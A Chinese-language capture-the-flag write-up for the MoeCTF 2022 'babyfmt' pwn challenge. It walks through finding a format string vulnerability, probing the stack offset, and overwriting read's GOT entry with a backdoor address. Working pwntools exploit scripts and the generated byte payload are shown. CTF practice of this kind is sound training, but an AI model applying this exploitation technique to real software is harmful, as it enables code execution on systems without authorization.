# [MoeCTF 2022]babyfmt_WP

**利用格式化字符串漏洞实现got劫持**

> **平台**：NSSCTF  
> **方向**：Pwn  
> **知识点**：格式化字符串、GOT劫持  
> **难度**：中等

## 一、信息获取

![image01](/pwn/[MoeCTF%202022]babyfmt_WP/image/image01.png)

checksec一下，只有NX对做本题没有关系

这里没有开启PIE因此地址不会随机改变

## 二、分析

![image02](/pwn/[MoeCTF%202022]babyfmt_WP/image/image02.png)

查看伪代码

后门的地址被放入了s，下面把s的地址打印了出来（**注意：这里只是把s本身的地址打印了出来，而不是s指向的后门地址**），因此我在做题的时候将gift忽视了。

在while循环中构建了buf并直接打印了buf，这里就存在格式化字符串漏洞

![image03](/pwn/[MoeCTF%202022]babyfmt_WP/image/image03.png)

![image04](/pwn/[MoeCTF%202022]babyfmt_WP/image/image04.png)

此时的已知信息：backdoor的地址、got表的地址

因此我的思路是利用格式化字符串漏洞先试探出offset（ 参数偏移量=buf在栈上的开头为第几个参数），利用%n将后门的地址写入read的got表内，这样循环在执行read时就可以拿到shell了

## 三、EXP

### 先进行试探

```python
from pwn import *

io = process("./pwn")
io.send(b"AAAA" + b"-%p"*20)

io.interactive()
```

![image05](/pwn/[MoeCTF%202022]babyfmt_WP/image/image05.png)

数一下0x41414141的位置在第11个参数，因此offset为11

### exp

```python
from pwn import *

context(os ="linux",arch="i386",log_level="info")

read_got = 0x0804a00c
back =0x804859B
offset=11

io=remote(...)

io.recvuntil(b"gift:")
io.recvline()

payload = fmtstr_payload(offset, {read_got:back},write_size="byte")
#输入相应的内容可以直接构造出所需的payload
log.info("payload (%d bytes): %s", len(payload), payload)
#日志：可以看到构造出来的payload的内容

io.send(payload)

io.interactive()
```

```
payload (48 bytes): b'%8c%20$hhn%147c%21$hhn%1002c%22$hnaa\x0f\xa0\x04\x08\x0c\xa0\x04\x08\r\xa0\x04\x08'
```

```
payload也就是%8c   %20$hhn    %147c    %21$hhn    %1002c     %22$hn  aa p32(0x0804A00F) + p32(0x0804A00C) + p32(0x0804A00D)
```

发送payload就可以得到shell了

## 四、总结

got劫持

反思：可以根据已知信息梳理出攻击逻辑，再进行攻击。

思路仅供参考，如有疑问或发现疏漏，欢迎各位师傅在评论区指正交流。
